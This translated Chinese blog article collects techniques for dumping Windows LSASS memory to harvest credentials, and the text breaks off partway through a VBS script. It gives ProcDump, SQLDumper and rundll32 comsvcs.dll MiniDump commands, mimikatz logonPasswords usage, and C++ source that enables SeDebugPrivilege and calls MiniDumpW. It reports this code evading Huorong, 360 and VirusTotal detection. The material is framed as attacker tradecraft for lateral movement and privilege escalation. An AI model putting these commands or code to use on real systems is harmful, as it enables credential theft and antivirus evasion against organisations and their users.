# 转储lsass的方法原理和实现学习
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
`lsass.exe（Local Security Authority Subsystem
Service`进程空间中，存有着机器的域、本地用户名和密码等重要信息。如果获取本地高权限，用户便可以访问`LSASS`进程内存，从而可以导出内部数据（password），用于横向移动和权限提升。
之前用的方式还是比较局限，很容易就会被AV进行监测拦截下来，在这里总结一部分转储lsass的方法:
## 1\. 微软签名文件
  * ProcDump  
ProcDump是微软签名的合法二进制文件，被提供用于转储进程内存。  
可以在微软文档中下载官方给出的ProcDump文件: ****
我们以管理员的方式运行:
    Procdump64.exe -accepteula -ma lsass.exe lsass.dmp
得到转储文件`lsass.dmp`后我们将这个内存dump文件拷贝到mimikatz同目录下，双击打开mimikatz执行情况如图：
    mimikatz # sekurlsa::minidump lsass.dmp
    Switch to MINIDUMP
    mimikatz # sekurlsa::logonPasswords full
就能够获取其目标机器的Hash
其实这种原理是`lsass.exe`是Windows系统的安全机制，主要用于本地安全和登陆策略，通常在我们登陆系统时输入密码后，密码便会存贮在`lsass.exe`内存中，经过wdigest和tspkg两个模块调用后，对其使用可逆的算法进行加密并存储在内存中，而Mimikatz正是通过对lsass.exe逆算获取到明文密码。
火绒确实不查，但是实战过程中也遇到Procdump被杀的情况，推测可能是签名的有效期过了，这里是使用刚下好的Procdump
360不管签名的时间戳是不是有效都会通杀`Procdump.exe`，因此这种方式还是比较局限的
**2.任务管理器**
打开任务管理器，选中目标进程，右键菜单中点击“创建转储文件”，文件保存为%temp%\.dmp。
但是这种方式就相比更加鸡肋
**3.SQLDumper**
`SQLDumper.exe`包含在Microsoft SQL和Office中，可生成完整转储文件。
    tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号
    Sqldumper.exe ProcessID 0 0x01100  导出mdmp文件
实战中下把生成的mdmp文件下载到本地，使用相同的操作系统打开。
    mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit
文件是安全的，火绒和360都不会认为是可以或者是恶意程序，但是在转储该`lsass.exe`进程时会出现
**3.Comsvcs.dll**
每个Windows系统中都可以找到该文件，可以使用Rundll32执行其导出函数MiniDump实现进程的完全转储。
该文件是一个白名单文件，我们主要是利用了`Comsvsc.dll`中的导出函数API`MiniDump`来实现转储`lsass.exe`的目的，注意同样是需要管理员权限:  
该文件位于`C:\windows\system32\comsvcs.dll`  
我们使用如下方式来调用MiniDump实现转储lsass.exe进程:
    rundll32 C:\windows\system32\comsvcs.dll MiniDump " dump.bin full"
该行为太过于敏感，在原理上都是通过API`MiniDumpWriteDump()`获得进程的dmp文件
而某些安全产品已经开始拦截这种行为，拦截的方法如下：
**通过用户模式下的API hook，使用跳转(JMP)命令将NtReadVirtualMemory()的前5个字节修改为指向另一个内存地址**
因此我们可以不妨自己实现一个该DLL的功能，主要为`MiniDump`的功能来绕过行为检测  
在`comsvcs.dll`找到了我们需要使用的`MiniDumpw`函数:
>
> 这里还需要解释为什么有时候在cmd下无法使用comsvcs.dll的MiniDump来转储内存文件，因为在dump指定进程内存文件时，需要开启`SeDebugPrivilege权限`，而在cmd中是默认没有开启该权限的  
>  
>  而在PS中是默认开启的选项:  
>  
>  因此在实战中可以考虑多使用:
>  
>  
>     powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 508
> C:\86189\lsass.dmp full"
>  
>
> 已达到转储lsass.exe的目的
而权限提升可以使用`RtlAdjustPrivilege`来进行，这个函数封装在`NtDll.dll`中
下图是找到的定义和解释:
参数的含义：
    Privilege [In] Privilege index to change.                        
    // 所需要的权限名称，可以到 MSDN 查找关于 Process Token & Privilege 内容可以查到
    Enable [In] If TRUE, then enable the privilege otherwise disable.
    // 如果为True 就是打开相应权限，如果为False 则是关闭相应权限
    CurrentThread [In] If TRUE, then enable in calling thread, otherwise process.
    // 如果为True 则仅提升当前线程权限，否则提升整个进程的权限
    Enabled [Out] Whether privilege was previously enabled or disabled.
    // 输出原来相应权限的状态（打开 | 关闭）, 注意：该参数赋予空指针会出错
具体有关该函数的实现可以参考这篇文章:  
[https://bbs.pediy.com/thread-76552.htm](https://)
总而言之这个函数能够做的事就是可以将进程赋予 **SeDebugPrivilege权限** 以此来Dump内存文件
因此借鉴下国外作者的原版代码:
    // BypassHashdump.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
    //
    #define UNICODE //使用UNICODE 对应main函数就是wmain
    #include 
    #include 
    typedef HRESULT(WINAPI* _MiniDumpW)(
        DWORD arg1, DWORD arg2, PWCHAR cmdline
        );
    typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
        ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled
        );
    // "  full"
    int wmain(int argc, wchar_t* argv[]) {
        HRESULT hr;
        _MiniDumpW MiniDumpW;
        _RtlAdjustPrivilege RtlAdjustPrivilege;
        ULONG t;
        //从comsvcs.dll中获得MiniDunpw导出函数
        MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
        //从NTdll中获得RtlAdjustPrivilege导出函数用户提权
        RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlAdjustPrivilege");
        if (MiniDumpW == NULL) {
            printf("Unable to resolve COMSVCS!MiniDumpW.\n");
            return 0;
        }
        if (RtlAdjustPrivilege == NULL) {
            printf("Unable to resolve RtlAdjustPrivilege.\n");
            return 0;
        }
        // 获取SeDebugPrivilege,最后一个参数别设置为NULL
        RtlAdjustPrivilege(20, TRUE, FALSE, &t);
        printf("Invoking COMSVCS!MiniDumpW(\"%ws\")\n", argv[1]);
        //dump lsass.exe
        MiniDumpW(0, 0, argv[1]);
        printf("OK!\n");
        return 0;
    }
火绒和360均未拦截，并且VT免杀率尚可:
并且火绒和360都不会检测到其行为:
作者还提到了使用VBS来实现首先开启`SeDebugPrivilege`权限，接着执行rundll32的命令
    Option Explicit
    Const SW_HIDE = 0
    If (WScript.Arguments.Count <> 1) Then
        WScript.StdOut.WriteLine("procdump - Copyright (c) 2019 odzhan")
        WScript.StdOut.WriteLine("Usage: procdump ")
        WScript.Quit
    Else
        Dim fso, svc, list, proc, startup, cfg, pid, str, cmd, query, dmp
        ' get process id or name
        pid = WScript.Arguments(0)
        ' connect with debug privilege
        Set fso  = CreateObject("Scripting.FileSystemObject")
        Set svc  = GetObject("WINMGMTS:{impersonationLevel=impersonate, (Debug)}")
        ' if not a number
        If(Not IsNumeric(pid)) Then
          query = "Name"
        Else
          query = "ProcessId"
        End If
        ' try find it
        Set list = svc.ExecQuery("SELECT * From Win32_Process Where " & _
          query & " = '" & pid & "'")
        If (list.Count = 0) Then
          WScript.StdOut.WriteLine("Can't find active process : " & pid)
          WScript.Quit()
        End If
        For Each proc in list
          pid = proc.ProcessId
          str = proc.Name
          Exit For
        Next
        dmp = fso.GetBaseName(str) & ".bin"
        ' if dump file already exists, try to remove it
        If(fso.FileExists(dmp)) Then
          WScript.StdOut.WriteLine("Removing " & dmp)
          fso.DeleteFile(dmp)
        End If
        WScript.StdOut.WriteLine("Attempting to dump memory from " & _
          str & ":" & pid & " to " & dmp)
        Set proc       = svc.Get("Win32_Process")
        Set startup    = svc.Get("Win32_ProcessStartup")
        Set cfg        = startup.SpawnInstance_
        cfg.ShowWindow = SW_HIDE
        cmd = "rundll32 C:\windows\system32\comsvcs.dll, MiniDump " & _
              pid & " " & fso.GetAbsolutePathName(".") & "\" & _
              dmp & " full"
        Call proc.Create (cmd, null, cfg, pid)
        ' sleep for a second
        Wscript.Sleep(1000)
        If(fso.FileExists(dmp)) Then
          WScript.StdOut.WriteLine("Memory saved to " & dmp)
        Else